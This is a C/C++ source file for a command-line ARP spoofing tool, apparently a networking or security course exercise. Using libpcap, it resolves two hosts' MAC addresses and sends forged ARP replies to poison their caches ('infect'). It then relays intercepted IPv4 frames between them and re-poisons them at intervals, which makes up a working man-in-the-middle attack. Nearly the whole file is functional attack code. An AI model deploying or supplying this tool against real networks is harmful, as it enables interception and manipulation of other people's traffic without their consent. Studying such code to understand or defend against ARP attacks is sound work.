#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <sys/ioctl.h>
#include <cstring>
#include <sys/socket.h>
#include <time.h>

#define EthICMPPacket 98

#pragma pack(push, 1)
struct EthArpPacket final {
        EthHdr eth_;
        ArpHdr arp_;
};
#pragma pack(pop)



void usage() {
        printf("syntax: send-arp-test <interface> <sender's IP> <target's IP> [sender's IP] [target's IP]\n");
        printf("sample: send-arp-test wlan0 192.0.10.5 192.0.10.1 192.0.10.1 192.0.10.5\n");
}
EthArpPacket* get_sender_mac(unsigned char* mac, char* sip, char* tip, pcap_t *handle)
{
	//###########GET SENDER's MAC ADDRESS##############
        EthArpPacket packet1;
        packet1.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet1.eth_.smac_ = Mac(mac);
        packet1.eth_.type_ = htons(EthHdr::Arp);

        packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet1.arp_.pro_ = htons(EthHdr::Ip4);
        packet1.arp_.hln_ = Mac::SIZE;
        packet1.arp_.pln_ = Ip::SIZE;
        packet1.arp_.op_ = htons(ArpHdr::Request);
        packet1.arp_.smac_ = Mac(mac);
        packet1.arp_.sip_ = htonl(Ip(sip));
        packet1.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet1.arp_.tip_ = htonl(Ip(tip));

        int res1 = -1;
	while(res1 != 0) res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
	
	const u_char* receive1;
        struct pcap_pkthdr* header;
        EthArpPacket *pack_reply;
	int count = 0;
        while(1)
        {
                int res2 = pcap_next_ex(handle, &header, &receive1);
		count++;
		printf("getting sender's mac...\n");
                pack_reply = (EthArpPacket *)receive1;
                if(pack_reply->eth_.dmac_ == Mac(mac) && pack_reply->eth_.type_ == 0x0608 && pack_reply->arp_.op_ == htons(ArpHdr::Reply) && pack_reply->arp_.sip_ == packet1.arp_.tip_) break;
		if(count > 30) return get_sender_mac(mac, sip, tip, handle);
        }
	return pack_reply;
}
int infect(unsigned char* mac, EthArpPacket *pac, char *sip, char *tip, pcap_t *handle)
{
	EthArpPacket packet;
        packet.eth_.dmac_ = pac->arp_.smac_;
        packet.eth_.smac_ = Mac(mac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(mac);
	packet.arp_.sip_ = htonl(Ip(sip));
        packet.arp_.tmac_ = pac->arp_.smac_;
        packet.arp_.tip_ = htonl(Ip(tip));

	int res = -1;
	while(res != 0) res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        //std::this_thread::sleep_for(std::chrono::milliseconds(500));
	return 0;
}
int main(int argc, char* argv[]) {
        if (argc != 6) {
                usage();
                return -1;
        }
        char *dev = argv[1];
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
        if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }

	//#########GET MY MAC ADDRESS###########
    	int sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
   	if (sock_fd < 0) {
       		 perror("socket");
       		 return -1;
   	}
 	struct ifreq ifr;
   	strncpy(ifr.ifr_name, argv[1], IFNAMSIZ - 1);
    	ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    	if (ioctl(sock_fd, SIOCGIFHWADDR, &ifr) < 0) {
        	perror("ioctl");
        	close(sock_fd);
        	return -1;
    	}

    	unsigned char *mac = reinterpret_cast<unsigned char*>(ifr.ifr_hwaddr.sa_data);

    	close(sock_fd);



	//##################infect sender and target##################

	int c_infect = -1;
	EthArpPacket *packet2 = get_sender_mac(mac, argv[3], argv[2], handle);
	EthArpPacket sender1_packet = *packet2;
	EthArpPacket *packet3 = get_sender_mac(mac, argv[5], argv[4], handle);
	printf("Success\n");
	EthArpPacket sender2_packet = *packet3;
	while(c_infect != 0) c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
	c_infect = -1;
	while(c_infect != 0) c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
	printf("Infect Success\n");

	//##################ARP SPOOFING############
	
	const u_int8_t* receive1;
	const u_char* backup;
	struct pcap_pkthdr* header;
	EthArpPacket *pack;

	clock_t last_relay, now;
	double gap = 0;
	last_relay = clock();
	while(1)
	{
                int res2 = pcap_next_ex(handle, &header, &receive1);
		
		pack = (EthArpPacket *)receive1;

                if(pack->eth_.type_ == 0x0008)
		{
			if(pack->eth_.smac_ == sender1_packet.arp_.smac_ || pack->eth_.smac_ == sender2_packet.arp_.smac_)
			{
				last_relay = clock();
				if(pack->eth_.smac_ == sender1_packet.arp_.smac_)
				{
					printf("[flow: 1]");
					pack->eth_.dmac_ = sender2_packet.arp_.smac_;
				}
				else
				{
					printf("[flow: 2]");
					pack->eth_.dmac_ = sender1_packet.arp_.smac_;
				}
				int res_relay = -1;
				int cnt = 0;
		   		while(res_relay != 0)
				{	
					cnt++;
					c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
                        		c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
					res_relay = pcap_sendpacket(handle, receive1, header->caplen);
					c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
                        		c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
					printf(" .");
					if(cnt > 20)
					{
						cnt = 0;
						printf("failure");
						break;
					}
				}
				printf("\n");
			}
		}

		if(pack->eth_.type_ != 0x0608) continue;
		else if(pack->eth_.smac_ == sender1_packet.arp_.smac_)
		{
			c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
			c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
		}
		else if(pack->eth_.smac_ == sender2_packet.arp_.smac_)
		{
			c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
			c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
		}

		if(pack->eth_.dmac_ == Mac("ff:ff:ff:ff:ff:ff"))
		{
			c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
                        c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
		}
		now = clock();
		gap = now - last_relay;
		if(gap > 2000)
                {
			last_relay = clock();
                        printf("regular infection\n");
                        c_infect = infect(mac, &sender1_packet, argv[3], argv[2], handle);
                        c_infect = infect(mac, &sender2_packet, argv[5], argv[4], handle);
                }
	}

        pcap_close(handle);
}


